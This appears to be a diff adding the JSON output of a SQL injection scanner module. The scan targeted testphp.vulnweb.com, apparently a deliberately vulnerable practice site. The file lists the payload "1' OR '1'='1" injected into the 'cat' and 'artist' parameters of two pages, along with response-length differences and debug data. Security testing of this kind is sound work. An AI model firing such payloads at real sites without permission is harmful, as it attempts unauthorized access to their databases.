@@ -1,0 +1,77 @@
+{
+  "module": "rm_mod_002_sqli",
+  "target": "http://testphp.vulnweb.com",
+  "vulnerable": true,
+  "findings": [
+    {
+      "path": "/listproducts.php",
+      "payload": {
+        "cat": "1' OR '1'='1"
+      },
+      "len_diff": 5730,
+      "error_like": true
+    },
+    {
+      "path": "/artists.php",
+      "payload": {
+        "cat": "1' OR '1'='1"
+      },
+      "len_diff": 0,
+      "error_like": true
+    },
+    {
+      "path": "/listproducts.php",
+      "payload": {
+        "artist": "1' OR '1'='1"
+      },
+      "len_diff": 5844,
+      "error_like": true
+    },
+    {
+      "path": "/artists.php",
+      "payload": {
+        "artist": "1' OR '1'='1"
+      },
+      "len_diff": 4067,
+      "error_like": true
+    }
+  ],
+  "debug": [
+    {
+      "path": "/listproducts.php",
+      "good_status": 200,
+      "bad_status": 200,
+      "good_len": 7880,
+      "bad_len": 2150,
+      "len_diff": 5730,
+      "err_like": true
+    },
+    {
+      "path": "/artists.php",
+      "good_status": 200,
+      "bad_status": 200,
+      "good_len": 5328,
+      "bad_len": 5328,
+      "len_diff": 0,
+      "err_like": true
+    },
+    {
+      "path": "/listproducts.php",
+      "good_status": 200,
+      "bad_status": 200,
+      "good_len": 7994,
+      "bad_len": 2150,
+      "len_diff": 5844,
+      "err_like": true
+    },
+    {
+      "path": "/artists.php",
+      "good_status": 200,
+      "bad_status": 200,
+      "good_len": 6251,
+      "bad_len": 2184,
+      "len_diff": 4067,
+      "err_like": true
+    }
+  ]
+}
